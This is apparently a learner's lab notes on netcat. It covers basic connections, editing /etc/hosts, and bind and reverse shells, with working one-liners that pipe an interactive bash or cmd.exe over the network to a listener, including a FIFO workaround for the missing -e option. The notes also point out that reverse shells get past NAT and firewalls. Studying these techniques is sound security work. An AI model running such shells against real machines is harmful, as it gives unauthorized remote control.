- `netstat -nl` to show open ports

```zsh
# ssh amro@192.168.1.7
amro@lab:~$ nc -nlv 4444

```
attacker
```zsh
┌──(amro㉿amro)-[~]
└─$ nc -v 192.168.1.7 4444
192.168.1.7: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.1.7] 4444 (?) open

hi bro
```
Instead of every time typing `192.168.1.7` u can edit it  `nano /etc/hosts`

add `192.168.1.7     amro.net` so u can now use `amro.net` instead of putting ip every time
```zsh
┌──(root㉿amro)-[~]
└─# nano /etc/hosts 
127.0.0.1       localhost
127.0.1.1       amro
192.168.1.7     amro.net
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
- `ssh amro@amro.net`
- `nc -v amro.net 4444`

### bind shell (Target listening)
just add option `-e /bin/bash`

**note** `-e` is no longer available in modern systems because it`s insecure
Target
```zsh
nc -nlvp 4444 -e /bin/bash
```
Attacker
```zsh
nc -nv 192.168.1.7 4444
Connection to 192.168.1.7 4444 port [tcp/*] succeeded!

Nakerah-lab-v1
```
netcat with Windows `nc64.exe -nlvp 4444 -e cmd.exe`

This method `-e` is no longer available

✅ Use a FIFO (named pipe) workaround instead

Target
```zsh
amro@lab:~$ rm -f /tmp/f
amro@lab:~$ mkfifo /tmp/f
amro@lab:~$ nc -nlvp 4444 < /tmp/f | /bin/bash -i > /tmp/f 2>&1
```

### reverse shell ( Attacker Listening )
- Advantage: Bypasses NAT and firewalls (outbound traffic allowed).
attacker listening
```zsh
nc -nlvp 9000
```
Target sending `-e`
```zsh
nc -nv 192.168.1.5 9000 -e /bin/bash
```
👉 **Note** nc intentionally removed the `-e` option because it allows easy remote code execution and is considered insecure

So the above commands will not work unless system was old

✅ Use a FIFO (named pipe) workaround

Listener (attacker / Kali):
```zsh
nc -nlvp 9000
```
Target machine (reverse shell):
```zsh
rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.1.5 9000 > /tmp/f
```
- **Big picture (before details)**This single line manually connects bash’s keyboard and screen to a network socket using a FIFO, because nc -e is not allowed.

- ✅ `-i` forces bash to act like a human is typing. `-i` forces Bash to behave exactly like a real terminal session—showing a prompt, waiting for the next command, executing input line-by-line, sending output immediately, and treating piped, file, FIFO, or network input as if it were coming from a human typing at a keyboard—so the shell stays alive and usable instead of acting like a one-shot script.

- ✅ `2>&1` redirect err to output and `&` is just telling i mean the standard ouput not a file called 1 , so that i don`t lose the erorr messages 

- `mkfifo /tmp/f` A FIFO (named pipe) is a special file , It does not store data , It only passes data between processes

- `> /tmp/f (the loop closer)` Redirects data coming from the attacker into /tmp/f , /tmp/f feeds cat , cat feeds bash
